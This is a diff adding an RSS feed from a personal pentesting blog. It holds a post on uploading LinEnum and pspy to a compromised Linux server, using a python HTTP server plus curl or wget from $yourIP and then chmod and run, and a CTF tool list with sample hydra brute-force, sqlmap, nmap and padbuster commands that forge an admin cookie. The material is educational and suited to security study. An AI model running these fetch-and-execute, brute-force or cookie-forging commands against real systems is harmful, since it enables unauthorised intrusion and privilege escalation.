@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <docs>https://blogs.law.harvard.edu/tech/rss</docs>
+    <title>Privesc on theyknow</title>
+    <link>https://domain.example/tags/privesc/</link>
+    <description>Recent content in Privesc on theyknow</description>
+    <image>
+      <title>Privesc on theyknow</title>
+      <link>https://domain.example/tags/privesc/</link>
+      <url>https://images.alphacoders.com/712/thumb-1920-712781.jpg</url>
+    </image>
+    <ttl>1440</ttl>
+    <generator>After Dark 8.0.2 (Hugo 0.54.0)</generator>
+    <language>en-US</language>
+    <lastBuildDate>Thu, 22 Aug 2019 18:28:43 UT</lastBuildDate>
+    <atom:link href="https://domain.example/tags/privesc/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Upload enumeration tools to a linux server</title>
+      <link>https://domain.example/post/upload-tools/</link>
+      <pubDate>Sat, 20 Jul 2019 23:00:00 UT</pubDate>
+      <dc:creator>theyknow</dc:creator>
+      <guid>https://domain.example/post/upload-tools/</guid>
+      <description>Privilege Escalation (privesc) When getting access to a server, either during a CTF or a pentesting assignment, you will probably have a limited access to the server itself. Probably because you accessed it through a compromised user. Your goal is to find a way to become root which would give you unlimited access to the server and the running programs. See, developers and sysadmins can make mistakes and have the programs running with the wrong settings.</description>
+      <category domain="https://domain.example/categories/post">Post</category>
+      <content:encoded><![CDATA[ Privilege Escalation (privesc) When getting access to a server, either during a CTF or a pentesting assignment, you will probably have a limited access to the server itself. Probably because you accessed it through a compromised user. Your goal is to find a way to become root which would give you unlimited access to the server and the running programs. See, developers and sysadmins can make mistakes and have the programs running with the wrong settings. Leveraging these mistakes can give you the keys to root.
+Here are two extensive guides about privesc for Windows and Linux:  Windows privesc guide Linux privesc guide 
+You&amp;rsquo;ll notice in these guides that, to find the mistakes that will get us root, it&amp;rsquo;s all about enumerating the server permissions, the programs running, the cron jobs, etc. And we have tools to do that for us!
+I have a very limited experience in Windows privesc so I will explain how to upload enumeration tools to Linux servers only in this post. The tools From my Tools list, you&amp;rsquo;ll find these two very useful enumeration tools:
+pspy pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.  LinEnum Scripted Local Linux Enumeration &amp; Privilege Escalation Checks.  The command lines So now that we have the tools on our computer, how to get them to the compromised server?
+Quite simple: we will use a python module called SimpleHTTPServer. It is normally used like other modules in python programs, but the SimpleHTTPServer module can also be invoked directly using the -m switch of the interpreter with a port number argument. This serves the files relative to the current directory.
+python -m SimpleHTTPServer 80  With python3: python3 -m http.server 80  Now anyone with your IP address and this port number can access this directory and its files through HTTP request, including the compromised server!
+So we launch the SimpleHTTPServer from the directory where we have our LinEnum and pspy programs. And from the compromised linux server, we write: curl $yourIP/linenum.sh  cURL is a command-line tool for getting or sending data including files using URL syntax. Now your downloaded program won&amp;rsquo;t have the permission to run so to make it executable, write: chmod &#43;x linenum.sh  And now to execute it, write &amp;ldquo;./linenum.sh&amp;rdquo; in the server directory where the downloaded linenum program is.
+Sometimes, curl will not be authorized to be used by the user you compromised, but you can use wget in this case. Let&amp;rsquo;s use pspy this time as an example: wget $yourIP/pspy64  Same thing now, we do &amp;ldquo;chmod &#43;x pspy64&amp;rdquo; and then &amp;ldquo;./pspy64&amp;rdquo;, and it will run!
+I hope this was a useful article! There are probably other ways to upload files to a server such as using netcat, but I found the commands in this post to be the simplest for me. And of course I took the example of enumeration tools, but you can use it to upload many more useful tools you would need for your privesc!
+Have fun uploading files now!
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Pentesting tools</title>
+      <link>https://domain.example/tools/pentest/</link>
+      <dc:creator>theyknow</dc:creator>
+      <guid>https://domain.example/tools/pentest/</guid>
+      <description>This page will be a completely chaotic list of tools, articles, and ressources I use regularly in Pentesting and CTF situations. My goal is to update this list as often as possible with examples, articles, and useful tips. It will serve as a reference for myself when I forget things and hopefully help other to discover tools that they haven&amp;rsquo;t used. If you know of more tools or find a mistake, please contact me on Twitter or by email (links above).</description>
+      <category domain="https://domain.example/categories/tools">Tools</category>
+      <content:encoded><![CDATA[This page will be a completely chaotic list of tools, articles, and ressources I use regularly in Pentesting and CTF situations. My goal is to update this list as often as possible with examples, articles, and useful tips. It will serve as a reference for myself when I forget things and hopefully help other to discover tools that they haven&amp;rsquo;t used. If you know of more tools or find a mistake, please contact me on Twitter or by email (links above).
+(last edited: 22/08/2019)
+Was pinned on /r/hacking (even more tools suggested there): 
+Hydra
+hydra options $user/$passOptions $ip/$url serviceOptions
+Example I used during a CTF to find valid usernames:
+hydra -L usernames.txt -p password -f -s 5001 35.227.x.x http-post-form &#34;/hash/login:username=^USER^&amp;password=^PASS^:Invalid username&#34; -t 64  John the Ripper Another bruteforcing tool, for password hashes this time. I explain how to add a new rule in this post. john --wordlist=password.lst --rules mypasswd  hashcat hashcat is the world&#39;s fastest and most advanced password recovery utility, supporting five unique modes of attack for over 200 highly-optimized hashing algorithms. hashcat currently supports CPUs, GPUs, and other hardware accelerators on Linux, Windows, and macOS, and has facilities to help enable distributed password cracking.
+Important note: a VM won&#39;t have access to your hardware so you&#39;ll need to do modifications to make it work as it will try to use GPU.  SQLMap I use this tool a lot for SQL injections. For more information, check this tutorial. sqlmap -u $url options Very useful option:
+--forms: Parse and test forms  WPScan WPScan is a free, for non-commercial use, black box WordPress vulnerability scanner written for security professionals and blog maintainers to test the security of their sites.
+wpscan --url myblog.com
+If a more stealthy approach is required, then wpscan --stealthy --url myblog.com can be used.
+When using the --enumerate option, don&#39;t forget to set the --plugins-detection accordingly, as its default is &#39;passive&#39;.  Pentestmonkey Reverse Shell The PHP reverse shell I use the most, you&#39;ll find it on this page with a tutorial on how to use it. Explore the rest of the Pentestmonkey website, it&#39;s great.  SecLists SecLists is the security tester&#39;s companion. It&#39;s a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.  NMAP No need to introduce this extremely useful tool, but here my usual command if it interests you:
+nmap -sV -sC -oN myscan.txt $ip  -sV: Version/Service info -sC: Run default scripts -oN: Normal output  Or the shorter version which combines sV and sC:
+nmap -A -oN myscan.txt $ip
+And if you do not need to be discreet (for certain CTFs without firewall f.ex.), you can add T5 which is the insane mode. T0 being the paranoid mode and will be a very slow scan.
+nmap -A -T5 -oN myscan.txt $ip
+Useful one-liner to look all the scripts that nmap can provide:
+locate -r &#39;\.nse$&#39; | xargs grep categories | grep &#39;default\|version&#39;
+Let&#39;s say you&#39;re looking for SMB scripts:
+locate -r &#39;\.nse$&#39; | xargs grep categories | grep &#39;default\|version&#39; | grep smb  Wfuzz Extremely useful for enumeration, Wfuzz is a tool designed for bruteforcing Web Applications, it can be used for finding resources not linked (directories, servlets, scripts, etc), bruteforce GET and POST parameters for checking different kind of injections (SQL, XSS, LDAP,etc), bruteforce Forms parameters (User/Password), Fuzzing, etc.
+wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.1.202/FUZZ  Dirb Another enumeration tool I use a lot.
+dirb http://$ip/ /usr/share/wordlists/dirb/common.txt  DirBuster Never enough enumeration tools! One more. This one as a GUI, so just type the command &#39;dirbuster&#39; and it will launch the program.  Nikto Did I say enumeration again? Nikto is the last enumeration tool I use. Never underestimate an effective enumeration during the recon phase.
+nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host $ip  Gobuster I know, I know: more enumeration. But trust me having different tools to enumerate directories often helped me during CTFs in the recon phase. Just choose the ones that will do the job.
+gobuster dir -u $url -w $wordlist  Sublist3r Sublist3r is a python tool designed to enumerate subdomains of websites using OSINT. Sublist3r enumerates subdomains using many search engines such as Google, Yahoo, Bing, Baidu, and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS.
+python sublist3r.py -d example.com  The Awesome Red Teaming List of Awesome Red Team / Red Teaming Resources. This list is for anyone wishing to learn about Red Teaming but do not have a starting point.  Osmedeus Osmedeus allows you automated run the collection of awesome tools to reconnaissance and vulnerability scanning against the target. Even has a slack bot to send notifications!
+./osmedeus.py -t example.com  XSS Hunter XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.
+Upon signing up you will create a special xss.ht short domain such as yoursubdomain.xss.ht which identifies your XSS vulnerabilities and hosts your payload. You then use this subdomain in your XSS testing and XSS Hunter will automatically serve up XSS probes and collect the resulting information when they fire.  pspy pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.
+I explain in this post how to upload enumeration tools to a server.  LinEnum Scripted Local Linux Enumeration &amp; Privilege Escalation Checks.
+I explain in this post how to upload enumeration tools to a server.  GTFOBins GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.  LOLBAS The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.  TCM Security Sample Pentest Report This is a template for a pentest report kindly given by the Cyber Mentor (subscribe to his channel, awesome content), and in his own words: &#34;I am frequently asked what an actual pentest report looks like. I am providing a barebones demo report for &#34;demo company&#34; that consisted of an external penetration test. The report only includes one finding and is meant to be a starter template for others to use. Please feel free to download and make this your own.&#34;  Cyber Chef A simple, intuitive web app for analysing and decoding data without having to deal with complex tools or programming languages. CyberChef encourages both technical and non-technical people to explore data formats, encryption and compression.
+Extremely usefull to quickly decrypt simple hashes. Highly recommend.  exiftool ExifTool is a platform-independent Perl library plus a command-line application for reading, writing and editing meta information in a wide variety of files. For example, I explain how I extracted hidden information in images in this post.  Wireshark Wireshark is the world’s foremost and widely-used network protocol analyzer. It lets you see what’s happening on your network at a microscopic level and is the standard. In many forensic CTF challenges, you might have a pcap (Packet Capture Data) to analyze and Wireshark is more than often the best tool to do that. I used it briefly in this post.  Rawsec&amp;rsquo;s CyberSecurity Inventory A much bigger inventory of tools and resources about CyberSecurity than mine here. Highly recommend if you want to scroll around and look at all the awesome tools that we have to play with.  explainshell explainshell is a tool (with a web interface) capable of parsing man pages, extracting options and explain a given command-line by matching each argument to the relevant help text in the man page.
+Tool recommended for this list by @n1cfury  PayloadsAllTheThings A list of useful payloads and bypasses for Web Application Security.
+You can contribute through pull requests, beers IRL or with buymeacoffee.com  PadBuster PadBuster is a Perl script for automating Padding Oracle Attacks. PadBuster provides the capability to decrypt arbitrary ciphertext, encrypt arbitrary plaintext, and perform automated response analysis to determine whether a request is vulnerable to padding oracle attacks.
+If you find a website that uses only cookies for authentification, it&#39;s a good idea to give PadBuster a try. Command example to decrypt:
+padbuster http://url.com/profile.php 4Ax3gr6sdNiBYo7LIkJUavx89eauhgqdrMICdOvdWmDMM6Oo%2BHiXmg%3D%3D 8 -cookies &#34;Cookie: PHPSESSID=bn22u9fe085pkut4nsnrrckm96; auth=4Ax3gr6sdNiBYo7LIkJUavx89eauhgqdrMICdOvdWmDMM6Oo%2BHiXmg%3D%3D&#34;
+For example, this could result in {&#34;user&#34;:&#34;test&#34;,&#34;role&#34;:&#34;user&#34;}
+So now, we can encrypt a new cookie with a different role:
+padbuster http://url.com/profile.php 4Ax3gr6sdNiBYo7LIkJUavx89eauhgqdrMICdOvdWmDMM6Oo%2BHiXmg%3D%3D 8 -cookies &#34;Cookie: PHPSESSID=bn22u9fe085pkut4nsnrrckm96; auth=4Ax3gr6sdNiBYo7LIkJUavx89eauhgqdrMICdOvdWmDMM6Oo%2BHiXmg%3D%3D&#34; -plaintext &#34;{\&#34;user\&#34;:\&#34;test\&#34;,\&#34;role\&#34;:\&#34;admin\&#34;}&#34;
+Which will give us a new encrypted cookie.  ]]></content:encoded>
+    </item>
+  </channel>
+</rss>
